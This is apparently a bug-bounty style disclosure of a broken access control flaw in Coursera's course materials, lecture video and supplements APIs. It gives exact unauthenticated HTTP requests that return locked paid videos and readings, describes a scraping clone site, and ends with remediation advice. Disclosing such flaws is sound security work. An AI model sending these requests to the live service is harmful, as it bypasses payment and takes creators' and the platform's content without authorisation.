# Coursera Paywall/Authorization Bypass via Unauthenticated API Access

## Summary

Multiple Coursera APIs expose paid course content (videos and supplementary materials) without requiring authentication or authorization. An attacker can access any course's complete video library and reading materials by simply knowing the course slug (visible in public URLs), completely bypassing payment requirements and access controls.

---
## Vulnerability Details

| Field | Value |
|-------|-------|
| **Vulnerability Type** | Broken Access Control (OWASP A01:2021) |
| **Severity** | High |
| **Attack Vector** | Network |
| **Authentication Required** | None |
| **User Interaction** | None |
| **Affected Endpoints** | `onDemandCourseMaterials.v2`, `onDemandLectureVideos.v1`, `onDemandSupplements.v1` |

---
## Affected Assets

- `https://www.coursera.org/api/onDemandCourseMaterials.v2/`
- `https://www.coursera.org/api/onDemandLectureVideos.v1/`
- `https://www.coursera.org/api/onDemandSupplements.v1/`

---
## Scope

This vulnerability affects **individual courses** — the foundational content unit of Coursera's platform. Individual courses:

- Comprise the building blocks of Professional Certificates, Specializations, and Degrees
- Are sold standalone (typically $49-$99 per course)
- Number in the **thousands** across the platform
- Include content from partners like IBM, Google, Meta, and major universities

Professional Certificates and Specializations were not directly tested as they utilize different API structures. However, since these programs are composed of individual courses, the underlying course content may still be accessible through the vulnerable endpoints.

---
## Business Impact

- **Revenue Loss**: Paid content accessible for free, undermining subscription and course purchase models
- **Intellectual Property Theft**: Course videos and materials can be mass-downloaded and redistributed
- **Brand Damage**: Threat actors could create competing platforms reselling Coursera content at lower prices
- **Partner Trust**: Content providers (IBM, Google, universities) may lose trust in Coursera's ability to protect their materials

---
## Confirmation steps
### Prerequisites
- Any HTTP client (browser, curl, Burp Suite)
- No Coursera account required
### Step 1: Obtain Course Slug

Navigate to any Coursera course page. The course slug is visible in the URL:

```
https://www.coursera.org/learn/ibm-penetration-testing-threat-hunting-cryptography

# ibm-penetration-testing-threat-hunting-cryptography = Course Slug
```

![Pasted image 20251225204830](pictures/Pasted%20image%2020251225204830.png)
### Step 2: Enumerate Course Materials (No Authentication)

Query the course materials API to retrieve the course ID and all item IDs:

```http
GET /api/onDemandCourseMaterials.v2/?q=slug&slug=ibm-penetration-testing-threat-hunting-cryptography&includes=modules,lessons,passableItemGroups,passableItemGroupChoices,passableLessonElements,items,tracks,gradePolicy,gradingParameters,embeddedContentMapping&fields=moduleIds,onDemandCourseMaterialModules.v1(name,slug,description,timeCommitment,lessonIds,optional,learningObjectives),onDemandCourseMaterialLessons.v1(name,slug,timeCommitment,elementIds,optional,trackId),onDemandCourseMaterialItems.v2(name,originalName,slug,timeCommitment,contentSummary,isLocked,lockableByItem,itemLockedReasonCode,trackId,lockedStatus,itemLockSummary)&showLockedItems=true HTTP/2
Host: www.coursera.org
User-Agent: Mozilla/5.0
```

**Response contains:**
- Course ID: `6gFvP03FEeqFPAqOSKAo5Q`
- All Item IDs for every module (including locked/paid content)

```json
{
  "elements": [
    {
      "moduleIds": ["Doe5E", "jNphq", "MIY4j", "pZDVr", "h6MgE", "sOHCW"],
      "id": "6gFvP03FEeqFPAqOSKAo5Q"
    }
  ],
  "linked": {
    "onDemandCourseMaterialLessons.v1": [
      {
        "itemIds": ["um7tL", "6H7MD", "EXfAx"],
        "name": "Welcome",
        "elementIds": ["item~um7tL", "item~6H7MD", "item~EXfAx"]
      }
    ]
  }
}
```

![Pasted image 20251225122926](pictures/Pasted%20image%2020251225122926.png)
*Only Module 1 should be accessible with a free account*

![Pasted image 20251225142848](pictures/Pasted%20image%2020251225142848.png)
*API returns item IDs for ALL modules including locked content (Modules 2-6)*
### Step 3: Access Locked Video Content (No Authentication)

Using the course ID and any item ID, query the lecture videos API:

```http
GET /api/onDemandLectureVideos.v1/6gFvP03FEeqFPAqOSKAo5Q~puDZI?includes=video&fields=onDemandVideos.v1(sources,subtitles,subtitlesVtt,subtitlesTxt,subtitlesAssetTags,dubbedSources,dubbedSubtitlesVtt),disableSkippingForward,startMs,endMs HTTP/2
Host: www.coursera.org
User-Agent: Mozilla/5.0
```

**Response contains direct video URLs at multiple resolutions:**

```json
{
  "byResolution": {
    "1080p": {
      "mp4VideoUrl": "https://[cloudfront-url]/video.mp4",
      "webMVideoUrl": "https://[cloudfront-url]/video.webm"
    },
    "720p": { "mp4VideoUrl": "..." },
    "540p": { "mp4VideoUrl": "..." },
    "360p": { "mp4VideoUrl": "..." },
    "240p": { "mp4VideoUrl": "..." }
  }
}
```

![Pasted image 20251225145051](pictures/Pasted%20image%2020251225145051.png)
*Successfully accessing paid video content from a locked module*
### Step 4: Access Locked Reading Materials (No Authentication)

Query the supplements API for course readings:

```http
GET /api/onDemandSupplements.v1/6gFvP03FEeqFPAqOSKAo5Q~6H7MD?includes=asset&fields=openCourseAssets.v1(typeName),openCourseAssets.v1(definition),minimumDurationToComplete HTTP/2
Host: www.coursera.org
User-Agent: Mozilla/5.0
```

![Pasted image 20251225150940](pictures/Pasted%20image%2020251225150940.png)
*Reading content from locked modules returned without authentication*

---
## Proof of Concept: "Classera" Clone Site

To demonstrate real-world exploitation potential, I created a proof-of-concept website that:
1. Takes only a course slug as input
2. Automatically extracts all course content via the vulnerable APIs
3. Presents the content in a video learning platform format

![Pasted image 20251225152135](pictures/Pasted%20image%2020251225152135.png)


![Pasted image 20251225152213](pictures/Pasted%20image%2020251225152213.png)

![Pasted image 20251225152408](pictures/Pasted%20image%2020251225152408.png)

![Pasted image 20251225152428](pictures/Pasted%20image%2020251225152428.png)

> **Note**: This proof-of-concept was never made publicly available and was created solely to demonstrate the severity of this vulnerability.

https://github.com/user-attachments/assets/44cacdf4-099c-48e5-9e56-48de3090b234

---
## Root Cause Analysis

The vulnerable APIs fail to implement authentication and authorization checks:

1. **No Authentication**: APIs accept requests without any cookies, tokens, or credentials
2. **No Authorization**: No verification that the requesting user has purchased or enrolled in the course
3. **Information Disclosure**: The `showLockedItems=true` parameter reveals all content IDs regardless of access level

---
## Recommended Remediation

1. **Implement Authentication**: Require valid session tokens for all content-serving APIs
2. **Implement Authorization**: Verify the authenticated user has purchased/enrolled in the course before returning content
3. **Remove `showLockedItems` Parameter**: Do not expose locked content IDs to users without access
4. **Sign Video URLs**: Use time-limited, user-specific signed URLs for video content
5. **Rate Limiting**: Implement rate limiting to prevent mass content scraping
6. **Monitoring**: Add anomaly detection for bulk API access patterns

---
## References

- [OWASP Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [CWE-284: Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)
- [CWE-862: Missing Authorization](https://cwe.mitre.org/data/definitions/862.html)
